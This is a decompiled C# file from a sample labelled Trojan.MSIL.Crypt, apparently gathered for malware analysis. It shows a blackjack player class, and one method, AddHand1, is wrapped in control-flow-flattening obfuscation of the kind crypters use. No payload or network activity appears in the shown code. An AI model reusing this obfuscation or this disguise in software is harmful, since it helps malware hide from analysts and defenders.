// Decompiled with JetBrains decompiler
// Type: BindableIterableToEnumerableAdap.AssemblyInformationalVersionAttrib
// Assembly: DictionaryValueCollect, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 264A7E74-FCA9-4101-A215-90F8B6150D1A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan.MSIL.Crypt.hzzu-0a11971438302748e2f40e97f73af5e24c71212b30c9d6a5aff7ff102e662c94.exe

using ICompa;
using IMoni;
using System.Collections.Generic;

namespace BindableIterableToEnumerableAdap
{
  public class AssemblyInformationalVersionAttrib : SymbolTo
  {
    public int Bet { get; set; }

    public int Insurance { get; set; }

    internal List<UnknownWrap> Hand1 { get; set; }

    internal List<UnknownWrap> Hand2 { get; set; }

    public bool Hand1Flipped { get; set; }

    public bool Hand2Flipped { get; set; }

    public AssemblyInformationalVersionAttrib()
    {
    }

    public AssemblyInformationalVersionAttrib(
      string id,
      string UserName,
      int Balance,
      int WinStreak,
      int WinCount,
      int LoseCount,
      int Games,
      int Owing,
      double AvgBet,
      int MaxBet,
      int MinBet,
      string LastPlay,
      int CurrentStreak)
      : base(id, UserName, Balance, WinStreak, WinCount, LoseCount, Games, Owing, AvgBet, MaxBet, MinBet, LastPlay, CurrentStreak)
    {
      this.Bet = 0;
      this.Insurance = 0;
      this.Hand1 = new List<UnknownWrap>();
      this.Hand2 = new List<UnknownWrap>();
      this.Hand1Flipped = false;
      this.Hand2Flipped = false;
    }

    internal void AddHand1(UnknownWrap Card)
    {
label_1:
      int num1 = -1080747315;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -506286613)) % 4U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * 1857031456 ^ 533759047;
            continue;
          case 2:
            this.Hand1.Add(Card);
            num1 = (int) num2 * -831211806 ^ 2135189642;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    internal void AddHand2(UnknownWrap Card) => this.Hand2.Add(Card);
  }
}
